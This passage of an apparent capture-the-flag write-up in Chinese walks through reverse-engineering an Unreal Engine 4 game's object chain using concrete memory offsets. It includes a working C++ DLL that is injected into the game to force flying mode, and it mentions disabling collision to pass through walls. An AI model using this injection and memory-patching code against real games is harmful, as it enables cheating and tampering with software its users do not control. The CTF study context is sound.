</tr>
<tr>
<td><code>MOVE_Flying</code></td>
<td>飞行类角色（如幽灵、飞行器）</td>
<td>关闭重力，使用自由三维移动</td>
</tr>
<tr>
<td><code>MOVE_Custom</code></td>
<td>自定义移动，如“攀爬”、“滑行”</td>
<td>游戏开发者自己扩展逻辑</td>
</tr>
</tbody></table>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014193847028.png" alt="image-20251014193847028"></p>
<p>我们能发现这里还有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014201041665.png" alt="image-20251014201041665"></p>
<p>ACharacter是什么?</p>
<blockquote>
<p>ACharacter：UE4 自带的行走类Actor，继承自 APawn。含网格体、胶囊体、UCharacterMovementComponent 等，负责角色移动、跳跃等行为。你操作飞行&#x2F;穿墙时的目标对象就是本地玩家的 ACharacter 实例</p>
</blockquote>
<p>这些是 <strong>编译时静态断言（static_assert）</strong>，用于验证 <strong>类成员变量的内存偏移</strong>是否正确。</p>
<p><code>UCharacterMovementComponent::MovementMode</code> 与 <code>PendingLaunchVelocity</code>这些字段属于 <code>UCharacterMovementComponent</code>（角色移动组件），控制角色的物理状态。</p>
<p>我们除了这些关键属性之外还需要知道世界链路</p>
<p>在 UE 逆向中，<strong>找到世界链路</strong> 是理解游戏对象体系的关键。</p>
<p><strong>世界结构简图：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GWorld → UWorld</span><br><span class="line">         ├─ PersistentLevel (ULevel)</span><br><span class="line">         │   ├─ AActor[0] = DefaultPawn</span><br><span class="line">         │   ├─ AActor[1] = PlayerCharacter</span><br><span class="line">         │   └─ ...</span><br><span class="line">         ├─ GameInstance</span><br><span class="line">         ├─ GameMode</span><br><span class="line">         ├─ PlayerController</span><br><span class="line">         └─ etc.</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>名称</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>GWorld</code></strong></td>
<td><code>UWorld*</code> 全局指针</td>
<td>当前正在运行的世界（全局变量）</td>
</tr>
<tr>
<td><strong><code>UWorld</code></strong></td>
<td>类对象</td>
<td>世界实例本身，包含关卡、玩家、Actor 列表等</td>
</tr>
</tbody></table>
<blockquote>
<p><code>GWorld</code> 就是指向当前 <code>UWorld</code> 的全局变量。</p>
</blockquote>
<p>在内存调试中，通常会通过 <code>GWorld</code> 找到整个世界的根：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = GWorld;</span><br><span class="line">ULevel* Level = World-&gt;PersistentLevel;</span><br><span class="line">TArray&lt;AActor*&gt; Actors = Level-&gt;Actors;</span><br></pre></td></tr></table></figure>

<p>这样就能遍历世界中所有的角色对象。</p>
<table>
<thead>
<tr>
<th>元素</th>
<th>含义</th>
<th>逆向用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>offsetof</code></td>
<td>成员偏移</td>
<td>定位内存字段、直接读写对象成员</td>
</tr>
<tr>
<td><code>CharacterMovement</code></td>
<td>角色移动组件指针</td>
<td>控制角色物理行为（走、飞、跳）</td>
</tr>
<tr>
<td><code>CapsuleComponent</code></td>
<td>碰撞体组件</td>
<td>检测碰撞、修改 hitbox 尺寸</td>
</tr>
<tr>
<td><code>MovementMode</code></td>
<td>当前移动模式</td>
<td>判断或强制移动状态</td>
</tr>
<tr>
<td><code>PendingLaunchVelocity</code></td>
<td>等待应用的速度</td>
<td>修改跳跃或击飞效果</td>
</tr>
<tr>
<td><code>GWorld → UWorld</code></td>
<td>世界根节点</td>
<td>遍历所有 Actor，找到玩家对象</td>
</tr>
</tbody></table>
<p>在游戏中找到了玩家对象地址 <code>PlayerCharacter</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCharacterMovementComponent* MoveComp =  *(UCharacterMovementComponent**)(PlayerCharacter + 0x288);</span><br></pre></td></tr></table></figure>

<p>接下来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MoveComp-&gt;MovementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">MoveComp-&gt;PendingLaunchVelocity = FVector(0, 0, 3000);</span><br></pre></td></tr></table></figure>

<p>角色立刻能在空中飞行或超高跳。</p>
<ul>
<li>UWorld::OwningGameInstance：指向当前世界所属的 UGameInstance。GameInstance 持有全局状态，如本地玩家列表、子系统等，是沿 GWorld 找到你这边玩家控制器的入口。</li>
<li>APawn：可被玩家或 AI 控制的 Actor 基类。ACharacter 就是 APawn 的一个扩展版本，加入了骨骼网格和 CharacterMovement。</li>
<li>APlayerController::AcknowledgedPawn：玩家控制器当前“正式控制”的 Pawn 指针。正常游戏里它就是你的角色 Pawn（如 ACharacter），读取后才能继续修改移动组件&#x2F;碰撞。</li>
<li>APlayerController：表示本地或远端的玩家控制器，处理输入、相机、HUD 等。我们从 UGameInstance::LocalPlayers 取得的 ULocalPlayer-&gt;PlayerController 就是本地玩家的控制器，顺着它的 AcknowledgedPawn 拿到角色后才能进行后续 hack。</li>
</ul>
<p>世界链路</p>
<ul>
<li>GWorld（基址 base + 0x49EE370，与setOffsets() 中 OFFSET_GWORLD 相符）指向当前关卡对应的 UWorld。</li>
<li>UWorld + 0x180（OwningGameInstance）拿到 UGameInstance，这是全局封装玩家列表的对象。</li>
<li>UGameInstance + 0x38（LocalPlayers 的 TArray）提供本地玩家数组，下标 0 通常是本地玩家。</li>
<li>ULocalPlayer-&gt;PlayerController（UPlayer::PlayerController 在 …:8986 给出 0x30）接到 APlayerController，再用 AcknowledgedPawn 偏移 0x2A0 取到实际 Pawn。</li>
<li>Pawn + 0x288（CharacterMovement）就能定位 UCharacterMovementComponent；后续通过 MovementMode、PendingLaunchVelocity 等偏移修改为飞行或冲刺，或者抓取 CapsuleComponent(0x290) 调 SetCollisionEnabled 实现穿墙。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014220645122.png" alt="image-20251014220645122"></p>
<p>在编写代码时我们可以用reinterpret_cast</p>
<p>reinterpret_cast<T>(expr) 是 C++ 提供的强制类型转换之一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在没有类型信息/类定义不足的情况下，把某个指针或整数当成别的类型的指针来访问。</span><br><span class="line">与UE这类内存操作结合时，我们经常只有偏移值，所以先把基址转成 uint8_t*，加偏移后再 reinterpret_cast&lt;目标类型*&gt;，这样就能把那块内存看成某个字段或结构。</span><br></pre></td></tr></table></figure>

<p>FVector 在 BasicType.h 里被定义成三个 float 分量（X&#x2F;Y&#x2F;Z）。C++ 允许对这种简单结构做聚合初始化，{a, b, c} 就会依次填入 X&#x2F;Y&#x2F;Z，所以 {0.f, 0.f, 800.f} 会写成 (0,0,800)。</p>
<p>数值 800&#x2F;600 只是示例：PendingLaunchVelocity 相当于给角色一个即将施加的冲量，LastUpdateVelocity 是当前速度。这两个字段只要写入任何 FVector，UE4 就会按这些分量处理运动；如果想要更慢或更快的上升，可以自己改成别的值。</p>
<p>exp：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span>   <span class="comment">// UEDumper 导出的基础类型，提供 TArray 等模板</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 简易前向声明 -----------------------------------------------------------</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前我们发现的状态</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 偏移常量（来自 merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h） ---</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CHARACTERMOVEMENT = <span class="number">0x288</span>;          <span class="comment">// 角色移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC = <span class="number">0x25C</span>; <span class="comment">// LastUpdateVelocity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 全局状态 ---------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_flyEnabled&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 便捷访问函数 -----------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据偏移找GWorld</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取实例，拿本地玩家列表，我们要拿[0]</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一帧实际被控制的 Pawn，拿到这个指针就能访问 ACharacter</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(</span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CHARACTERMOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 写飞行相关字段 ---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLandMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunchVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续维持飞行状态，防止游戏自动还原</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// movementMode 本质是 *(EMovementMode*)(base + 0x168) 的别名,base 指向 UCharacterMovementComponent 的起始地址. base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE 跳到 MovementMode 字段； reinterpret_cast&lt;EMovementMode*&gt; 把那块内存视为 EMovementMode * ；</span></span><br><span class="line">    <span class="comment">// 通过引用赋值 movementMode = EMovementMode::MOVE_Flying; 就是把那 1 字节的内存直接写成飞行枚举。</span></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (lastUpdateVelocity.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVelocity.Z = <span class="number">400.f</span>; <span class="comment">// 给一点上升速度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 热键线程 ---------------------------------------------------------------</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            g_flyEnabled = !g_flyEnabled.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, g_flyEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement，能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">            用 TArray::IsValidIndex 防御空指针，配合持续刷新 MovementMode 就能稳定维持飞行。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g_flyEnabled) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">                        <span class="built_in">SustainFly</span>(movement);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">  